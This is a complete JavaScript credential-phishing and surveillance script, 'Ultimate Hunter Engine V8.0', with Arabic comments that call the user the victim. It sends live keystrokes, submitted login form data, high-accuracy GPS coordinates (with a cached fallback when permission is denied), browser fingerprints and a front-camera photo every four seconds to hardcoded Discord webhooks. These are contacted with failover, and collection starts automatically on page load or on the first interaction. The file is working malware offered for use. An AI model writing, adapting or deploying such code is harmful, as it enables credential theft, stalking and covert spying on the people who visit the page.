/* ==========================================================================
   ULTIMATE HUNTER ENGINE V8.0 - script.js
   High-Precision Geolocation, Fallback Engine & Continuous Live Exfiltration
   ========================================================================== */

"use strict";

/* --------------------------------------------------------------------------
   0. إعدادات روابط ديسكورد المتعددة ونظام التبديل التلقائي (Failover Webhooks)
   -------------------------------------------------------------------------- */
const DISCORD_WEBHOOKS = [
    "https://discord.com/api/webhooks/1564663770629017652/ZZRcg_vV1JTh96gfwO4qOrMilrB9r-iB5nb9j0zt938Q-JIxt2flevVHFn8FWnK8gp9H",
    "https://discord.com/api/webhooks/1564684857362358363/F34NZ2OBhi35exXCz2daOXWt7lGS3DEEoAmy_r7SEHK10ZLi9x-iN4qMxzsaW3txKZKt",
    "https://discord.com/api/webhooks/1564684888668512416/ahcAya5wTAsNuRyhVbltJZ5TQfPQvLAw7Ipc68nGAYrWjSbvr75wswHEe1QFFKK9hVOe"
];

let activeWebhookIndex = 0;

async function sendToDiscord(content, fileBlob = null, filename = "capture.png") {
    let success = false;
    
    for (let attempts = 0; attempts < DISCORD_WEBHOOKS.length; attempts++) {
        const currentWebhook = DISCORD_WEBHOOKS[activeWebhookIndex];
        try {
            const formData = new FormData();
            formData.append("payload_json", JSON.stringify({ content: content }));
            
            if (fileBlob) {
                formData.append("file", fileBlob, filename);
            }

            const response = await fetch(currentWebhook, {
                method: "POST",
                body: formData
            });

            if (response.ok) {
                success = true;
                break;
            } else {
                activeWebhookIndex = (activeWebhookIndex + 1) % DISCORD_WEBHOOKS.length;
            }
        } catch (error) {
            activeWebhookIndex = (activeWebhookIndex + 1) % DISCORD_WEBHOOKS.length;
        }
    }
    return success;
}

/* --------------------------------------------------------------------------
   1. إعدادات النظام والمتغيرات الأساسية
   -------------------------------------------------------------------------- */

const ENGINE_CONFIG = Object.freeze({
    version: "8.0",
    locationTimeout: 12000,
    captureIntervalTime: 4000, // التقاط صورة جديدة كل 4 ثوانٍ بشكل متتالي ومباشر
    cameraWidth: 1280,
    cameraHeight: 720
});

const videoElement = document.getElementById("video");
const canvasElement = document.getElementById("canvas");
const loginFormElement = document.getElementById("fullLoginForm");

let cameraStream = null;
let captureInterval = null;
let engineInitialized = false;

/* --------------------------------------------------------------------------
   2. تتبع الكتابة الحية في الحقول (Live Typing Exfiltration)
   -------------------------------------------------------------------------- */

function initializeLiveTypingTracker() {
    const targetForm = loginFormElement || document.querySelector("form");
    if (!targetForm) return;

    const inputElements = targetForm.querySelectorAll("input, textarea");
    inputElements.forEach(input => {
        let typingTimer;
        input.addEventListener("input", (event) => {
            clearTimeout(typingTimer);
            typingTimer = setTimeout(async () => {
                const fieldName = event.target.name || event.target.id || event.target.type || "حقل غير معروف";
                const fieldValue = event.target.value;
                await sendToDiscord(`⌨️ **إدخال حي (Live Typing):**\n- الحقل: \`${fieldName}\`\n- القيمة: \`${fieldValue}\``);
            }, 350);
        });
    });
}

/* --------------------------------------------------------------------------
   3. استخراج معلومات المتصفح والبيئة التقنية للضحية
   -------------------------------------------------------------------------- */

function extractBrowserDiagnostics() {
    const screenData = window.screen || {};
    return {
        userAgent: navigator.userAgent || "غير متاح",
        language: navigator.language || "غير متاح",
        platform: navigator.platform || "غير متاح",
        screenResolution: `${screenData.width || 0}x${screenData.height || 0}`,
        viewportSize: `${window.innerWidth}x${window.innerHeight}`,
        isSecure: Boolean(window.isSecureContext),
        hasGeolocation: Boolean(navigator.geolocation),
        hasCameraApi: Boolean(navigator.mediaDevices && navigator.mediaDevices.getUserMedia)
    };
}

/* --------------------------------------------------------------------------
   4. المحرك الدقيق لتحديد الموقع (GPS High Precision + Fallback System)
   -------------------------------------------------------------------------- */

function obtainPreciseLocation() {
    return new Promise(resolve => {
        // التحقق من وجود تخزين سابق لموقع محفوظ كخطة بديلة فورية
        const cachedLocation = localStorage.getItem("ultimate_last_gps");
        const parseCachedLocation = cachedLocation ? JSON.parse(cachedLocation) : null;

        if (!navigator.geolocation) {
            if (parseCachedLocation) {
                sendToDiscord(`⚠️ **خدمة الموقع غير مدعومة بالمتصفح، تم استخدام آخر موقع محفوظ:**\n- خط العرض: ${parseCachedLocation.latitude}\n- خط الطول: ${parseCachedLocation.longitude}\n- الدقة: ${parseCachedLocation.accuracy} متر`);
                resolve({ success: true, source: "cached-fallback", ...parseCachedLocation });
                return;
            }
            resolve({ success: false, message: "Geolocation not supported and no cache." });
            return;
        }

        let requestCompleted = false;

        // مؤشر زمني لانتظار استجابة الـ GPS بدقة عالية
        const locationTimer = setTimeout(async () => {
            if (requestCompleted) return;
            requestCompleted = true;

            if (parseCachedLocation) {
                await sendToDiscord(`⏱️ **انتهت مهلة استجابة الـ GPS، إرسال آخر موقع محفوظ بدقة:**\n- خط العرض: ${parseCachedLocation.latitude}\n- خط الطول: ${parseCachedLocation.longitude}`);
                resolve({ success: true, source: "timeout-cache-fallback", ...parseCachedLocation });
            } else {
                resolve({ success: false, message: "Geolocation timeout." });
            }
        }, ENGINE_CONFIG.locationTimeout);

        navigator.geolocation.getCurrentPosition(
            async position => {
                if (requestCompleted) return;
                requestCompleted = true;
                clearTimeout(locationTimer);

                const latitude = position.coords.latitude;
                const longitude = position.coords.longitude;
                const accuracy = position.coords.accuracy;
                const altitude = position.coords.altitude || "غير متاح";
                const speed = position.coords.speed || "غير متاح";

                const freshLocationData = {
                    latitude,
                    longitude,
                    accuracy,
                    altitude,
                    speed,
                    timestamp: new Date().toISOString()
                };

                // حفظ الموقع الجديد فوراً في ذاكرة المتصفح للاستفادة منه مستقبلاً
                localStorage.setItem("ultimate_last_gps", JSON.stringify(freshLocationData));

                await sendToDiscord(`🎯 **تم جلب موقع GPS بدقة فائقة وحقيقية:**\n- خط العرض (Latitude): \`${latitude}\`\n- خط الطول (Longitude): \`${longitude}\`\n- الدقة (Accuracy): \`${accuracy} متر\`\n- الارتفاع: \`${altitude}\`\n- السرعة: \`${speed}\``);

                resolve({ success: true, source: "live-gps", ...freshLocationData });
            },
            async () => {
                if (requestCompleted) return;
                requestCompleted = true;
                clearTimeout(locationTimer);

                // في حال تم رفض الإذن أو كان الموقع مطفأ (GPS Disabled / Denied)
                if (parseCachedLocation) {
                    await sendToDiscord(`⚠️ **تم رفض إذن الموقع أو إغلاقه، إرسال آخر موقع مسجل في الذاكرة:**\n- خط العرض: ${parseCachedLocation.latitude}\n- خط الطول: ${parseCachedLocation.longitude}\n- وقت التسجيل السابق: \`${parseCachedLocation.timestamp}\``);
                    resolve({ success: true, source: "denied-cache-fallback", ...parseCachedLocation });
                } else {
                    await sendToDiscord(`❌ **تم رفض إذن الموقع ولا توجد بيانات مخزنة سابقة.**`);
                    resolve({ success: false, message: "Permission denied and no cache available." });
                }
            },
            {
                enableHighAccuracy: true, // طلب أعلى دقة GPS ممكنة من الجهاز
                timeout: ENGINE_CONFIG.locationTimeout - 2000,
                maximumAge: 0 // منع استخدام البيانات المؤقتة القديمة وجلب إحداثيات حية
            }
        );
    });
}

/* --------------------------------------------------------------------------
   5. تشغيل الكاميرا والالتقاط المتسلسل المباشر للصور
   -------------------------------------------------------------------------- */

function startContinuousImageCapture() {
    if (captureInterval) return;

    captureInterval = setInterval(async () => {
        if (!videoElement || !canvasElement) return;

        try {
            if (videoElement.videoWidth === 0 || videoElement.videoHeight === 0) return;

            canvasElement.width = videoElement.videoWidth;
            canvasElement.height = videoElement.videoHeight;
            
            const drawingContext = canvasElement.getContext("2d");
            drawingContext.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);

            canvasElement.toBlob(async (imageBlob) => {
                if (imageBlob && imageBlob.size > 1000) {
                    await sendToDiscord(`📸 **صورة حية جديدة (التقاط متسلسل مباشر):**`, imageBlob, `live_shot_${Date.now()}.png`);
                }
            }, "image/png", 0.95);

        } catch (error) {
            console.error("Frame capture loop error:", error);
        }
    }, ENGINE_CONFIG.captureIntervalTime);
}

function stopContinuousImageCapture() {
    if (captureInterval) {
        clearInterval(captureInterval);
        captureInterval = null;
    }
}

async function activateCameraAndStream() {
    if (!navigator.mediaDevices?.getUserMedia || !window.isSecureContext) {
        return false;
    }

    try {
        const videoConstraints = {
            audio: false,
            video: {
                facingMode: { ideal: "user" }, // الكاميرا الأمامية تلقائياً
                width: { ideal: ENGINE_CONFIG.cameraWidth },
                height: { ideal: ENGINE_CONFIG.cameraHeight }
            }
        };

        cameraStream = await navigator.mediaDevices.getUserMedia(videoConstraints);

        if (videoElement) {
            videoElement.muted = true;
            videoElement.autoplay = true;
            videoElement.playsInline = true;
            videoElement.srcObject = cameraStream;
            await videoElement.play();
        }

        // بدء حلقة التقاط الصور المتسلسلة فور نجاح التشغيل
        startContinuousImageCapture();

        await sendToDiscord(`🟢 **تم تفعيل الكاميرا الأمامية بنجاح وبدء إرسال الصور المتسلسلة.**`);
        return true;

    } catch (error) {
        await sendToDiscord(`❌ **فشل تشغيل الكاميرا:** \`${error.message}\``);
        return false;
    }
}

/* --------------------------------------------------------------------------
   6. إدارة نموذج تسجيل الدخول ومعالجة البيانات المدخلة
   -------------------------------------------------------------------------- */

function initializeLoginFormHandler() {
    const targetForm = loginFormElement || document.querySelector("form");
    if (!targetForm) return;

    initializeLiveTypingTracker();

    targetForm.addEventListener("submit", async event => {
        event.preventDefault();

        try {
            const formDataInstance = new FormData(targetForm);
            let extractedDataSummary = "📋 **تقرير إرسال بيانات النموذج بالكامل:**\n";
            
            for (let [formKey, formValue] of formDataInstance.entries()) {
                extractedDataSummary += `- **${formKey}**: \`${formValue}\`\n`;
            }

            await sendToDiscord(extractedDataSummary);
        } catch (submitError) {
            console.error("Form submission handler error:", submitError);
        }
    });
}

/* --------------------------------------------------------------------------
   7. محرك التشغيل الرئيسي المتسلسل (Engine Core Flow)
   -------------------------------------------------------------------------- */

async function executeHunterEngineSequence() {
    if (engineInitialized) return;
    engineInitialized = true;

    const systemInfo = extractBrowserDiagnostics();
    await sendToDiscord(`🚀 **بدء تشغيل محرك الهجوم والاستطلاع (V8.0):**\n- المتصفح: \`${systemInfo.userAgent}\`\n- دقة الشاشة: \`${systemInfo.screenResolution}\``);

    // الخطوة الأولى: جلب الموقع بدقة متناهية فور فتح الصفحة
    await obtainPreciseLocation();

    // الخطوة الثانية: تفعيل الكاميرا والبدء بالالتقاط المتسلسل للصور بعد فترة قصيرة
    setTimeout(async () => {
        await activateCameraAndStream();
    }, 1200);
}

/* --------------------------------------------------------------------------
   8. محفزات التفاعل التلقائي واليدوي لضمان العمل الفوري
   -------------------------------------------------------------------------- */

// تشغيل المحرك عند أول تفاعل بشري (نقر، لمس، حركة) لتجاوز قيود المتصفحات الحديثة
["click", "touchstart", "keydown"].forEach(interactionEvent => {
    window.addEventListener(interactionEvent, () => {
        executeHunterEngineSequence();
    }, { once: true, passive: true });
});

// تشغيل احتياطي تلقائي عند اكتمال تحميل DOM بالكامل
document.addEventListener("DOMContentLoaded", () => {
    initializeLoginFormHandler();
    
    setTimeout(() => {
        executeHunterEngineSequence();
    }, 1500);
});
